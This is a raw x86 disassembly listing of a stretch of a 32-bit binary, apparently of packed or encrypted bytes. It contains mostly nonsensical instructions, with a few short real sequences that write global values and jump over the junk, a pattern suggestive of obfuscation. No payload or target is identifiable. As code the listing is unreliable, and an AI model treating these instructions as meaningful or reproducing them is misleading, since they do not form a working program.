  41cbb4:	jb     0x41cb88
  41cbb6:	clc    
  41cbb7:	mov    ecx,0x8c28f57d
  41cbbc:	aaa    
  41cbbd:	ja     0x41cc1e
  41cbbf:	add    edi,DWORD PTR [edx+0x2b3fb4ee]
  41cbc5:	push   ecx
  41cbc6:	push   cs
  41cbc7:	btc    DWORD PTR [esi-0x46],ecx
  41cbcb:	stos   DWORD PTR es:[edi],eax
  41cbcc:	out    0xe1,al
  41cbce:	(bad)  
  41cbcf:	aam    0xac
  41cbd1:	popa   
  41cbd2:	add    edx,ecx
  41cbd4:	imul   edx,edi
  41cbd7:	sub    ebx,DWORD PTR ds:0x42a301
  41cbdd:	mov    edi,DWORD PTR [ebp-0x8]
  41cbe0:	mov    ebx,DWORD PTR [ebp-0x10]
  41cbe3:	or     DWORD PTR ds:0x42a401,0x42a385
  41cbed:	sub    ebx,edi
  41cbef:	mov    DWORD PTR ds:0x42a339,0xb6b
  41cbf9:	jmp    0x41d10b
  41cbfe:	aas    
  41cbff:	int3   
  41cc00:	ret    0xd1d7
  41cc03:	aad    0xd9
  41cc05:	aam    0x8c
  41cc07:	stc    
  41cc08:	stos   BYTE PTR es:[edi],al
  41cc09:	push   0xffffffab
  41cc0b:	cdq    
  41cc0c:	xor    DWORD PTR [esp+edx*4-0x60],edx
  41cc10:	jg     0x41cc8a
  41cc12:	jae    0x41cc90
  41cc14:	js     0x41cc8e
  41cc16:	arpl   WORD PTR [ecx-0x4b831fbf],sp
  41cc1c:	jne    0x41cc89
  41cc1e:	ds ins BYTE PTR es:[edi],dx
  41cc20:	lahf   
  41cc21:	(bad)  
  41cc22:	out    0x1,eax
  41cc24:	add    esp,DWORD PTR [esi]
  41cc26:	aaa    
  41cc27:	iret   
  41cc28:	out    0xe6,al
  41cc2a:	scas   al,BYTE PTR es:[edi]
  41cc2b:	call   0xfe9a9213
  41cc30:	mov    cl,0xc0
  41cc32:	outs   dx,BYTE PTR ds:[esi]
  41cc33:	fsubr  DWORD PTR [edx-0x4996b0f0]
  41cc39:	out    dx,eax
  41cc3a:	pop    ebp
  41cc3b:	jb     0x41cc66
  41cc3d:	rcr    DWORD PTR [edi-0x392833e5],0xd4
  41cc44:	sub    eax,ecx
  41cc46:	and    DWORD PTR [edx+0x19],eax
  41cc49:	mov    al,0x66
  41cc4b:	std    
  41cc4c:	cmp    al,0x1d
  41cc4e:	pop    esi
  41cc4f:	sbb    eax,0x685d21ef
  41cc54:	das    
  41cc55:	rcl    dl,1
  41cc57:	lods   al,BYTE PTR ds:[esi]
  41cc58:	aas    
  41cc59:	pop    ds
  41cc5a:	call   0x8be6f3c1
  41cc5f:	sub    DWORD PTR [edx],ecx
  41cc61:	mov    ds:0x5be804fb,al
  41cc66:	fisttp WORD PTR [esi-0x7425ae0d]
  41cc6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc6d:	cld    
  41cc6e:	les    esp,FWORD PTR ds:0xc59db9fc
  41cc74:	jo     0x41cc82
  41cc76:	aam    0xf1
  41cc78:	scas   eax,DWORD PTR es:[edi]
  41cc79:	mov    eax,0x62bdd20a
  41cc7e:	out    dx,al
  41cc7f:	add    al,0xac
  41cc81:	pop    ebx
  41cc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc83:	ficomp WORD PTR [esi]
  41cc85:	xchg   edi,eax
  41cc86:	sti    
  41cc87:	loopne 0x41cc8a
  41cc89:	loop   0x41cca3
  41cc8b:	jmp    0x41cc3c
  41cc8d:	int    0xaa
  41cc8f:	dec    esp
  41cc90:	pop    edx
  41cc91:	inc    ebp
  41cc92:	or     esp,DWORD PTR [ebp+0x31]
  41cc95:	jmp    ebx
  41cc97:	ds and al,0x3d
  41cc9a:	nop
  41cc9b:	dec    edi
  41cc9c:	mov    dh,0x67
  41cc9e:	mov    edi,0xd88e87d9
  41cca3:	ins    DWORD PTR es:[edi],dx
  41cca4:	popf   
  41cca5:	in     al,dx
  41cca6:	fnsave [ecx-0x14]
  41cca9:	add    ah,dh
  41ccab:	adc    ebx,DWORD PTR [edi-0x68]
  41ccae:	test   eax,0x6e88d4cb
  41ccb3:	imul   esp,DWORD PTR [ecx-0x2e],0xcd5391a5
  41ccba:	(bad)  [ebp-0x1c]
  41ccbd:	and    eax,0x7b78f67f
  41ccc2:	aas    
  41ccc3:	(bad)  
  41ccc4:	mov    bl,0xd1
  41ccc6:	cmp    BYTE PTR [esi],cl
  41ccc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccc9:	jmp    0x41ccd8
  41cccb:	les    eax,FWORD PTR [edi+0x35683acb]
  41ccd1:	push   esi
  41ccd2:	ror    BYTE PTR [bp+di-0x77],1
  41ccd6:	addr16 aam 0xb5
  41ccd9:	fs or  eax,DWORD PTR es:[eax-0x7362de4b]
  41cce1:	adc    ah,BYTE PTR [ebp+0x6]
  41cce4:	pop    eax
  41cce5:	xchg   DWORD PTR [esp+edi*1-0x651a8de6],edx
  41ccec:	arpl   WORD PTR [edi+0x5d],bp
  41ccef:	xor    eax,0x3ef64f74
  41ccf4:	push   es
  41ccf5:	aam    0x61
  41ccf7:	and    eax,0xbe8b1b29
  41ccfc:	pop    esp
  41ccfd:	mov    edi,0x56cd4a39
  41cd02:	xchg   esi,eax
  41cd03:	xchg   ebx,eax
  41cd04:	mov    bh,0x84
  41cd06:	js     0x41cd66
  41cd08:	aaa    
  41cd09:	jmp    0x41ccb7
  41cd0b:	push   0x796f887a
  41cd10:	out    dx,al
  41cd11:	out    dx,al
  41cd12:	gs mov dh,0xdb
  41cd15:	push   ebp
  41cd16:	lea    esp,[edi]
  41cd18:	ins    DWORD PTR es:[edi],dx
  41cd19:	iret   
  41cd1a:	jmp    0x6df2e95c
  41cd1f:	(bad)  
  41cd20:	mov    dl,0x9e
  41cd22:	fdiv   QWORD PTR [edi+eiz*8]
  41cd25:	xchg   ebx,eax
  41cd26:	mov    fs,WORD PTR [edx+0x44976f1c]
  41cd2c:	push   edx
  41cd2d:	jle    0x41cd65
  41cd2f:	inc    ecx
  41cd30:	jge    0x41cd20
  41cd32:	fidivr WORD PTR [edx+0x438a9370]
  41cd38:	or     BYTE PTR [edx+esi*4+0x1b19858c],dl
  41cd3f:	mov    esp,0x9e957380
  41cd44:	scas   eax,DWORD PTR es:[edi]
  41cd45:	mov    ds:0xafcbdbb,eax
  41cd4a:	mov    gs,WORD PTR [ebx+0x514bcb29]
  41cd50:	pop    ecx
  41cd51:	inc    ebp
  41cd52:	test   BYTE PTR [ebx+0x666c30bb],cl
  41cd58:	mov    ds:0x9e4721d6,eax
  41cd5d:	leave  
  41cd5e:	add    esp,DWORD PTR [ecx+0x2a110c1f]
  41cd64:	test   BYTE PTR [ebp+0x1f],dh
  41cd67:	scas   eax,DWORD PTR es:[edi]
  41cd68:	enter  0xa4e4,0x6a
  41cd6c:	aaa    
  41cd6d:	mov    dl,0xed
  41cd6f:	push   ss
  41cd70:	pop    esi
  41cd71:	xchg   DWORD PTR [edx+0x3b],edx
  41cd74:	loope  0x41cd57
  41cd76:	pop    ss
  41cd77:	adc    DWORD PTR [ecx],esi
  41cd79:	jmp    edi
  41cd7b:	mov    ch,0x9b
  41cd7d:	jb     0x41cd7d
  41cd7f:	rol    BYTE PTR [esi-0x73],cl
  41cd82:	sar    DWORD PTR [edi+0x5c],cl
  41cd85:	call   0x901e9e32
  41cd8a:	shr    dh,1
  41cd8c:	pusha  
  41cd8d:	push   esp
  41cd8e:	adc    DWORD PTR [edi+0x5e566e93],0x8b67ea89
  41cd98:	mov    BYTE PTR [ebx+0x1],bh
  41cd9b:	ror    BYTE PTR [ebx+0x64],0x44
  41cd9f:	test   al,0x13
  41cda1:	sbb    eax,0xade6c555
  41cda6:	int    0xea
  41cda8:	mov    bh,0xcc
  41cdaa:	fmul   QWORD PTR [eax-0x65c4f69]
  41cdb0:	lods   eax,DWORD PTR ds:[esi]
  41cdb1:	xchg   esp,eax
  41cdb2:	call   0xe02977e4
  41cdb7:	dec    edi
  41cdb8:	(bad)  
  41cdb9:	and    DWORD PTR [edx-0x607ee35f],ebp
  41cdbf:	jecxz  0x41cdd4
  41cdc1:	and    edx,DWORD PTR [edx]
  41cdc3:	shr    DWORD PTR [eax+0x19],cl
  41cdc6:	into   
  41cdc7:	add    eax,DWORD PTR [esp+esi*1]
  41cdca:	loopne 0x41cd77
  41cdcc:	dec    eax
  41cdcd:	out    0x6a,eax
  41cdcf:	call   0x458a:0x235840b
  41cdd6:	data16 jb 0x41ce39
  41cdd9:	jae    0x41cd7b
  41cddb:	inc    ebp
  41cddc:	adc    ebx,DWORD PTR [edi+0x5a]
  41cddf:	stc    
  41cde0:	jmp    0x41cdee
  41cde2:	stos   DWORD PTR es:[edi],eax
  41cde3:	mov    ss,WORD PTR [eax]
  41cde5:	mov    dl,0x79
  41cde7:	fild   WORD PTR [ebx+0x5a238ba2]
  41cded:	jl     0x41cdf0
  41cdef:	ss jb  0x41ce5f
  41cdf2:	dec    esi
  41cdf3:	mov    gs,WORD PTR [eax+0x3caedb40]
  41cdf9:	adc    DWORD PTR [ebx],0x53
  41cdfc:	push   esi
  41cdfd:	add    bh,BYTE PTR [esi+0x7]
  41ce00:	pop    ecx
  41ce01:	or     esi,DWORD PTR [edx-0x7f]
  41ce04:	adc    bh,BYTE PTR [ebp-0x775fcbea]
  41ce0a:	mov    esp,0xeb235355
  41ce0f:	sbb    al,0xdf
  41ce11:	push   ebx
  41ce12:	mov    cl,0x6a
  41ce14:	in     al,0x49
  41ce16:	inc    esp
  41ce17:	push   0x536004f1
  41ce1c:	or     DWORD PTR [edi],esi
  41ce1e:	das    
  41ce1f:	je     0x41cdd7
  41ce21:	aam    0xc2
  41ce23:	outs   dx,BYTE PTR ds:[esi]
  41ce24:	retf   0x159
  41ce27:	sti    
  41ce28:	aam    0xce
  41ce2a:	mov    ebx,cs
  41ce2c:	mov    gs,WORD PTR [eax-0x7b]
  41ce2f:	mov    eax,ds:0x96071636
  41ce34:	sub    edi,DWORD PTR [ebx-0x22632273]
  41ce3a:	mov    ecx,0x7ce77db4
  41ce3f:	loopne 0x41ce0b
  41ce41:	add    bh,al
  41ce43:	push   ebp
  41ce44:	ror    edi,cl
  41ce46:	out    0x1,eax
  41ce48:	loope  0x41ce03
  41ce4a:	(bad)  
  41ce4b:	scas   eax,DWORD PTR es:[edi]
  41ce4c:	mov    edi,0x92dbe4f
  41ce51:	jge    0x41cdec
  41ce53:	cmp    BYTE PTR [edx+0x6f8f7f65],0x0
  41ce5a:	ins    DWORD PTR es:[edi],dx
  41ce5b:	sbb    DWORD PTR [edx+0x7b],0x951b5a2
  41ce62:	das    
  41ce63:	or     cl,BYTE PTR [ebx]
  41ce65:	loopne 0x41ce5d
  41ce67:	pop    ebx
  41ce68:	mov    bh,0xf3
  41ce6a:	into   
  41ce6b:	(bad)  
  41ce6c:	jmp    0x41cedd
  41ce6e:	xchg   esp,eax
  41ce6f:	fbld   TBYTE PTR [ebp+0x19ac8976]
  41ce75:	ret    0x58d5
  41ce78:	fdivr  DWORD PTR [eax]
  41ce7a:	lahf   
  41ce7b:	ja     0x41cede
  41ce7d:	jmp    FWORD PTR [ebp-0x45]
  41ce80:	or     bl,ch
  41ce82:	mov    ecx,0xb48d68f6
  41ce87:	outs   dx,BYTE PTR ds:[esi]
  41ce88:	or     eax,0x74bc87ab
  41ce8d:	mov    esp,0x3b35f969
  41ce92:	jns    0x41ce8a
  41ce94:	ja     0x41ce57
  41ce96:	sub    cl,ch
  41ce98:	add    al,0x22
  41ce9a:	and    DWORD PTR [ecx+ebx*8+0xc2ea2c7],esi
  41cea1:	dec    ecx
  41cea2:	loopne 0x41ced5
  41cea4:	jae    0x41ceae
  41cea6:	(bad)  
  41cea7:	cld    
  41cea8:	ds xchg ecx,eax
  41ceaa:	jo     0x41cf0f
  41ceac:	(bad)
  41ceaf:	push   ebp
  41ceb0:	mov    dh,0xcf
  41ceb2:	test   DWORD PTR [eax+0x7d76cdda],ecx
  41ceb8:	ret    
  41ceb9:	ja     0x41cf02
  41cebb:	mov    ah,0x20
  41cebd:	mov    ch,0x12
  41cebf:	dec    edx
  41cec0:	mov    bl,0x8d
  41cec2:	xchg   esp,eax
  41cec3:	scas   eax,DWORD PTR es:[edi]
  41cec4:	test   eax,0x340c3f66
  41cec9:	push   ebp
  41ceca:	mov    bh,0xef
  41cecd:	test   DWORD PTR [esp+edx*2+0x1b],edi
  41ced1:	xor    ebp,ebx
  41ced3:	and    al,0x56
  41ced5:	jle    0x41cebe
  41ced7:	push   ebx
  41ced8:	xor    al,0xb9
  41ceda:	xor    DWORD PTR [edx],esp
  41cedc:	icebp  
  41cedd:	push   edi
  41cede:	(bad)  
  41cedf:	mov    edx,0x8104064e
  41cee4:	add    eax,0x2ca28110
  41cee9:	inc    esp
  41ceea:	push   esp
  41ceeb:	and    DWORD PTR [ecx-0x18],esp
  41ceee:	jne    0x41cee5
  41cef0:	dec    edx
  41cef1:	imul   esp,DWORD PTR [edx+ecx*8-0x1b],0xfffffff3
  41cef6:	mov    BYTE PTR [esi],al
  41cef8:	(bad)  
  41cef9:	and    ecx,DWORD PTR [ebx+ebx*2+0x3c15c09]
  41cf00:	sub    DWORD PTR [edx+0x7da1a6f],esp
  41cf06:	imul   edi,DWORD PTR [esi+0x4e],0x61610df4
  41cf0d:	xor    al,0xfe
  41cf0f:	cmp    edi,ecx
  41cf11:	into   
  41cf12:	mov    eax,0x55b09813
  41cf17:	xor    eax,0xb42a1dbb
  41cf1c:	call   0xf223:0x5c30431e
  41cf23:	fwait
  41cf24:	inc    esp
  41cf25:	mov    ah,0xe
  41cf28:	push   eax
  41cf29:	je     0x41cf22
  41cf2b:	add    al,0x2d
  41cf2d:	iret   
  41cf2e:	and    al,bh
  41cf30:	jmp    0x379c:0x5811b673
  41cf37:	mov    DWORD PTR [edx],ebx
  41cf39:	jno    0x41cf5b
  41cf3b:	cld    
  41cf3c:	inc    edi
  41cf3d:	mov    ebp,0x3f4b4f20
  41cf42:	mov    WORD PTR [edi-0x7d82cdb3],?
  41cf48:	sysret 
  41cf4a:	mov    ebp,0xb1477770
  41cf4f:	inc    eax
  41cf50:	dec    edx
  41cf51:	xchg   edx,eax
  41cf52:	cmovle ebp,DWORD PTR [ebx]
  41cf55:	mov    ebp,0x80bd0c73
  41cf5a:	inc    ebx
  41cf5b:	mov    edi,0x2bd01aca
  41cf60:	jmp    0x57b9:0xfdce9541
  41cf67:	jmp    0xaa5d:0x4fcf4471
  41cf6e:	jno    0x41cfa0
  41cf70:	ins    BYTE PTR es:[edi],dx
  41cf71:	test   al,0x9c
  41cf73:	sub    bh,BYTE PTR [esi-0x4b]
  41cf76:	and    eax,0xe18723c1
  41cf7b:	daa    
  41cf7c:	iret   
  41cf7d:	xor    eax,0x5f10820c
  41cf82:	dec    edx
  41cf83:	xchg   edi,eax
  41cf84:	outs   dx,DWORD PTR ds:[esi]
  41cf85:	fcomip st,st(6)
  41cf87:	repz cmp edi,eax
  41cf8a:	out    dx,al
  41cf8b:	sbb    eax,0x6b4eeeec
  41cf90:	out    dx,eax
  41cf91:	fwait
  41cf92:	scas   al,BYTE PTR es:[edi]
  41cf93:	imul   ecx,DWORD PTR [ebx+0x4d68c97c],0xfab5d43b
  41cf9d:	in     eax,dx
  41cf9e:	dec    ecx
  41cf9f:	lods   eax,DWORD PTR ds:[esi]
  41cfa0:	mov    al,ds:0xb6e8e4a9
  41cfa5:	mov    al,ds:0x907c3fa6
  41cfaa:	cmc    
  41cfab:	or     eax,0x645cac03
  41cfb0:	fisttp WORD PTR [esi-0x19e8357f]
  41cfb6:	clc    
  41cfb7:	push   ecx
  41cfb8:	iret   
  41cfb9:	(bad)  
  41cfba:	push   edi
  41cfbb:	frstor [edi+0x73665fa2]
  41cfc1:	xchg   ecx,eax
  41cfc2:	adc    DWORD PTR ss:[ebx+0x351f3e83],edx
  41cfc9:	dec    ebx
  41cfca:	fs aaa 
  41cfcc:	fs popa 
  41cfce:	fidiv  DWORD PTR [esi-0x32023614]
  41cfd4:	addr16 (bad) 
  41cfd7:	call   0xd852:0xb910e1a3
  41cfde:	rcr    ah,cl
  41cfe0:	push   cs
  41cfe1:	dec    ecx
  41cfe2:	lahf   
  41cfe3:	pop    es
  41cfe4:	adc    eax,DWORD PTR [ebx]
  41cfe6:	clc    
  41cfe7:	xor    BYTE PTR [esi+ebp*2-0x79],ch
  41cfeb:	xor    eax,0xe895a350
  41cff0:	sbb    al,BYTE PTR [edx]
  41cff2:	mov    ch,0x78
  41cff4:	xchg   esp,eax
  41cff5:	imul   eax,DWORD PTR [edi],0xffffffdd
  41cff8:	loopne 0x41cfae
  41cffa:	push   edx
  41cffb:	dec    edi
  41cffc:	push   esi
  41cffd:	jmp    0xba21856d
  41d002:	out    dx,al
  41d003:	jmp    0x41d060
  41d005:	xchg   esp,eax
  41d006:	hlt    
  41d007:	push   0x32f7e571
  41d00c:	dec    edx
  41d00d:	in     eax,dx
  41d00e:	lods   eax,DWORD PTR ds:[esi]
  41d00f:	mov    ds:0x396c83c9,al
  41d014:	(bad)  
  41d015:	sub    al,0x40
  41d017:	shr    ch,0x78
  41d01a:	or     al,0x36
  41d01c:	mov    cl,0xfd
  41d01e:	pop    edx
  41d01f:	stc    
  41d020:	les    ecx,FWORD PTR [ebp+ecx*8+0x77]
  41d024:	mov    ds:0x4d6495ab,al
  41d029:	cmp    eax,0x1b6df994
  41d02e:	fdiv   st(2),st
  41d030:	call   0xd0f2a362
  41d035:	dec    edx
  41d036:	cmp    edi,eax
  41d038:	push   0xe5a76a3e
  41d03d:	sar    DWORD PTR [esi+0x6f],cl
  41d040:	push   esp
  41d041:	dec    ebx
  41d042:	out    dx,al
  41d043:	sub    al,0x69
  41d045:	xor    bh,al
  41d047:	dec    ebx
  41d048:	add    BYTE PTR [ebp-0x3c],ch
  41d04b:	dec    ebx
  41d04c:	dec    esi
  41d04d:	adc    ecx,ebp
  41d04f:	scas   al,BYTE PTR es:[edi]
  41d050:	and    DWORD PTR [esi+0x1b],esi
  41d053:	aad    0x58
  41d055:	sub    edx,DWORD PTR [ebx-0x22]
  41d058:	icebp  
  41d059:	xor    DWORD PTR [eax-0x3a],0x662b3b55
  41d060:	jg     0x41d05d
  41d062:	xor    eax,0xb039388c
  41d067:	xchg   ecx,eax
  41d068:	into   
  41d069:	adc    eax,0x4ca9b32
  41d06e:	jp     0x41d0eb
  41d070:	sbb    esi,edi
  41d072:	sub    bh,dl
  41d074:	pop    ebp
  41d075:	and    BYTE PTR fs:[eax-0x7c60a203],al
  41d07c:	adc    eax,0x2359d7ee
  41d081:	aam    0xfc
  41d083:	call   0x2e4af478
  41d088:	mov    edi,0x7ebc5053
  41d08d:	add    eax,0xe5bb599f
  41d092:	ja     0x41d0b9
  41d094:	hlt    
  41d095:	popf   
  41d096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d097:	cs dec ecx
  41d099:	xchg   edx,eax
  41d09a:	das    
  41d09b:	sti    
  41d09c:	mov    dl,0x88
  41d09e:	mov    ah,0xfe
  41d0a0:	aam    0x6b
  41d0a2:	pop    ebp
  41d0a3:	dec    edx
  41d0a4:	stc    
  41d0a5:	in     al,0x7f
  41d0a7:	jge    0x41d0d6
  41d0a9:	les    ecx,FWORD PTR [ebx-0x70]
  41d0ac:	hlt    
  41d0ad:	loopne 0x41d063
  41d0af:	outs   dx,BYTE PTR ds:[esi]
  41d0b0:	push   ds
  41d0b1:	fnsave [esi+0x13]
  41d0b4:	sbb    DWORD PTR [eax],edx
  41d0b6:	sub    ebx,DWORD PTR [ecx-0x3aa9cac2]
  41d0bc:	sti    
  41d0bd:	fild   DWORD PTR [edi]
  41d0bf:	pusha  
  41d0c0:	mov    esi,0x5e856e8
  41d0c5:	pop    ds
  41d0c6:	shl    DWORD PTR [edi],cl
  41d0c8:	sub    eax,0x630124f7
  41d0cd:	push   ebp
  41d0ce:	jg     0x41d060
  41d0d0:	ret    0x9220
  41d0d3:	push   esp
  41d0d4:	shl    DWORD PTR [eax+0x7e8a4e58],0x78
  41d0db:	in     eax,0xc7
  41d0dd:	fwait
  41d0de:	je     0x41d0cd
  41d0e0:	fimul  WORD PTR [edx+eiz*4+0xeb80d70]
  41d0e7:	jmp    0xd3d7:0xa39137ba
  41d0ee:	out    0x1d,al
  41d0f0:	gs mov bh,0xff
  41d0f3:	in     al,dx
  41d0f4:	sbb    al,0x32
  41d0f6:	mov    ch,0xfe
  41d0f8:	cwde   
  41d0f9:	pop    ecx
  41d0fa:	push   dx
  41d0fc:	mov    edi,0x9c31fbd0
  41d101:	in     eax,0x93
  41d103:	std    
  41d104:	ins    BYTE PTR es:[edi],dx
  41d105:	mov    edi,0xcf59f424
  41d10a:	gs cmp ebx,edx
  41d10d:	mov    DWORD PTR ds:0x42a341,0x4781
  41d117:	jmp    0x41d629
  41d11c:	(bad)  
  41d11d:	xlat   BYTE PTR ds:[ebx]
  41d11e:	into   
  41d11f:	ror    dh,1
  41d121:	aad    0xc5
  41d123:	xlat   BYTE PTR ds:[ebx]
  41d124:	imul   edi,esp,0x4852692a
  41d12a:	loopne 0x41d14d
  41d12c:	(bad)  
  41d12d:	stos   DWORD PTR es:[edi],eax
  41d12e:	jg     0x41d1a8
  41d130:	jae    0x41d1ae
  41d132:	js     0x41d1ac
  41d134:	les    ebp,FWORD PTR [ebx-0x3e150fe1]
  41d13a:	or     edx,DWORD PTR [esi-0x39]
  41d13d:	loop   0x41d11d
  41d13f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d140:	jns    0x41d10c
  41d142:	test   eax,0x88606408
  41d147:	mov    dh,0x20
  41d149:	sub    dl,BYTE PTR [edi+0x50]
  41d14c:	jne    0x41d0ed
  41d14e:	ja     0x41d175
  41d150:	(bad)  
  41d152:	dec    esp
  41d153:	out    dx,eax
  41d154:	mov    DWORD PTR [ecx+ebx*4],esp
  41d157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d158:	shl    BYTE PTR [esi+0x6f1d8d9d],cl
  41d15e:	test   ecx,esp
  41d160:	sbb    dh,cl
  41d162:	pop    edi
  41d163:	arpl   sp,bx
  41d165:	cwde   
  41d166:	ficom  WORD PTR [ecx+0x34]
  41d169:	add    DWORD PTR [edx],eax
  41d16b:	outs   dx,BYTE PTR ds:[esi]
  41d16c:	call   0x3c68d1c
  41d171:	test   eax,0xf761371f
  41d176:	mov    ds:0x7043a1c1,al
  41d17b:	inc    edi
  41d17c:	(bad)  
  41d17d:	mov    ds:0xc074869c,al
  41d182:	shr    BYTE PTR [esi],1
  41d184:	and    esp,eax
  41d186:	xchg   esi,eax
  41d187:	pushf  
  41d188:	xchg   ebp,eax
  41d189:	outs   dx,BYTE PTR ds:[esi]
  41d18a:	les    edx,FWORD PTR [ecx+0x5f]
  41d18d:	dec    edi
  41d18e:	aam    0x1d
  41d190:	xchg   edx,eax
  41d191:	bound  esp,QWORD PTR [ebx+0x2e]
  41d194:	cmp    ah,BYTE PTR [esi-0x6f]
  41d197:	mov    ds:0x29c94b57,eax
  41d19c:	cli    
  41d19d:	shl    BYTE PTR [edx-0x2ec1d236],0x6c
  41d1a4:	and    eax,0xd643c135
  41d1a9:	dec    esp
  41d1aa:	aas    
  41d1ab:	pop    esp
  41d1ac:	addr16 inc ebx
  41d1ae:	ficomp DWORD PTR [ebp-0x19f8adf8]
  41d1b4:	add    dl,BYTE PTR [ebx+0xc]
  41d1b7:	test   al,0x92
  41d1b9:	and    dh,ch
  41d1bb:	cvtps2pi mm2,QWORD PTR [ebx]
  41d1be:	mov    al,ds:0x64028e04
  41d1c3:	add    al,0x12
  41d1c5:	push   ebp
  41d1c6:	xchg   BYTE PTR [ecx+eax*4+0x9d8b954],cl
  41d1cd:	rol    DWORD PTR [ebx-0x6fdf17d],1
  41d1d3:	lds    esi,FWORD PTR [ebx-0x3f587046]
  41d1d9:	aam    0xa6
  41d1db:	sti    
  41d1dc:	lods   eax,DWORD PTR ds:[esi]
  41d1dd:	add    edi,edi
  41d1df:	or     al,0x29
  41d1e1:	ror    BYTE PTR [ecx-0x2e],cl
  41d1e4:	std    
  41d1e5:	mov    dl,0xf0
  41d1e7:	dec    edi
  41d1e8:	(bad)  
  41d1e9:	stos   BYTE PTR es:[edi],al
  41d1ea:	daa    
  41d1eb:	test   BYTE PTR [eax+edi*2],0x88
  41d1ef:	pop    esi
  41d1f0:	pop    edx
  41d1f1:	cdq    
  41d1f2:	mov    dh,0x4d
  41d1f4:	cli    
  41d1f5:	pop    ecx
  41d1f6:	xlat   BYTE PTR ds:[ebx]
  41d1f7:	lods   al,BYTE PTR ds:[esi]
  41d1f8:	add    edx,0x6413ab00
  41d1fe:	sub    al,0xc2
  41d200:	xchg   edx,eax
  41d201:	mov    ds:0xe473c94c,al
  41d206:	cwde   
  41d207:	jmp    0xaf9ec915
  41d20c:	lea    edi,[edi-0xe]
  41d20f:	cmp    eax,0x875de784
  41d214:	les    esp,FWORD PTR [eax-0x6dae2d3f]
  41d21a:	pop    es
  41d21b:	add    dl,BYTE PTR [eax+0x20]
  41d21e:	movups xmm5,XMMWORD PTR [ecx+0x68]
  41d222:	add    DWORD PTR [ecx+0x3b],ebp
  41d225:	and    BYTE PTR [eax+0x5ed9676f],al
  41d22b:	pushf  
  41d22c:	callw  0xe1f6
  41d230:	sbb    DWORD PTR [edx+ebp*4-0x50],ebx
  41d234:	xlat   BYTE PTR ds:[ebx]
  41d235:	add    ebp,DWORD PTR [ebp+0x79af87e1]
  41d23b:	sti    
  41d23c:	push   ecx
  41d23d:	adc    eax,0x4ed5eb32
  41d242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d243:	jmp    0xbb47:0xb3f2b9c8
  41d24a:	popa   
  41d24b:	push   eax
  41d24c:	call   0x5294:0xf8d219b8
  41d253:	xchg   edx,eax
  41d254:	mov    BYTE PTR [esi],bl
  41d256:	jmp    0xe931:0x54183e44
  41d25d:	and    bh,ch
  41d25f:	hlt    
  41d260:	cmp    esi,DWORD PTR [ebp+0x7b]
  41d263:	xchg   ecx,eax
  41d264:	xlat   BYTE PTR ds:[ebx]
  41d265:	imul   eax,DWORD PTR [edi],0xffffffbe
  41d268:	fwait
  41d269:	xor    al,0x8
  41d26b:	sub    BYTE PTR [eax-0x1d],ah
  41d26e:	mov    bl,0xec
  41d270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d271:	mov    ds,WORD PTR [ebx+0x57]
  41d274:	jl     0x41d203
  41d276:	lods   eax,DWORD PTR ds:[esi]
  41d277:	dec    esi
  41d279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d27a:	lahf   
  41d27b:	ins    BYTE PTR es:[edi],dx
  41d27c:	test   BYTE PTR [ebx-0x7eb15373],dl
  41d282:	cmp    DWORD PTR ds:0xbc0950c1,edi
  41d288:	nop
  41d289:	pop    DWORD PTR [edx]
  41d28b:	call   0x7d9f:0x2a823326
  41d292:	imul   eax,DWORD PTR [ebp+0x57ae0ce8],0xffffffe9
  41d299:	jp     0x41d2ae
  41d29b:	cwde   
  41d29c:	and    al,0xbd
  41d29e:	ret    0xedf1
  41d2a1:	jo     0x41d232
  41d2a3:	das    
  41d2a4:	jbe    0x41d285
  41d2a6:	popa   
  41d2a7:	fld    TBYTE PTR [edx-0x32]
  41d2aa:	sti    
  41d2ab:	pushf  
  41d2ac:	les    edx,FWORD PTR [eax-0x5ac9df23]
  41d2b2:	jae    0x41d240
  41d2b4:	cmp    DWORD PTR [ecx],0x717d515
  41d2ba:	jno    0x41d2ca
  41d2bc:	jecxz  0x41d2fe
  41d2be:	and    BYTE PTR [eax+edi*1],0x47
  41d2c2:	jl     0x41d316
  41d2c4:	adc    BYTE PTR [ebx+0x18],bl
  41d2c7:	into   
  41d2c8:	push   cs
  41d2c9:	cmp    DWORD PTR [ebp+0x4d],ecx
  41d2cc:	scas   al,BYTE PTR es:[edi]
  41d2cd:	jae    0x41d345
  41d2cf:	mov    ecx,0xf52d8d58
  41d2d4:	cmp    DWORD PTR [eax+0x79],ebx
  41d2d7:	sub    esp,ebx
  41d2d9:	retf   
  41d2da:	xor    ebx,DWORD PTR [ecx-0x1a8d0559]
  41d2e0:	(bad)  
  41d2e1:	or     ebx,esp
  41d2e3:	retf   0x7b75
  41d2e6:	push   ebx
  41d2e7:	repnz test BYTE PTR [esi],0x4c
  41d2eb:	dec    edx
  41d2ec:	data16 hlt 
  41d2ee:	pop    eax
  41d2ef:	stos   DWORD PTR es:[edi],eax
  41d2f0:	mov    edx,0xd5ecb0a7
  41d2f5:	sub    DWORD PTR [edx],ebp
  41d2f7:	bound  eax,QWORD PTR [edi]
  41d2f9:	pop    edi
  41d2fa:	fisttp QWORD PTR [ebx]
  41d2fc:	cmp    eax,0x645a2280
  41d301:	dec    esp
  41d302:	imul   DWORD PTR [edx]
  41d304:	inc    esi
  41d305:	std    
  41d306:	outs   dx,BYTE PTR ds:[esi]
  41d307:	bnd jnp 0x41d2cd
  41d30a:	lea    esi,[ecx]
  41d30c:	pushf  
  41d30d:	sar    BYTE PTR [eax],0xdc
  41d310:	and    DWORD PTR [ebx-0x2c],eax
  41d313:	jns    0x41d2d8
  41d315:	sub    al,cl
  41d317:	pop    DWORD PTR [eax]
  41d319:	pop    eax
  41d31a:	jnp    0x41d33a
  41d31c:	jle    0x41d2ca
  41d31e:	adc    al,0x33
  41d320:	push   esi
  41d321:	jns    0x41d2db
  41d323:	cld    
  41d324:	imul   edx,DWORD PTR [esi+0x37cfcb6e],0xffffff9e
  41d32b:	xor    ah,BYTE PTR [esi-0x363db48]
  41d331:	and    al,0xb8
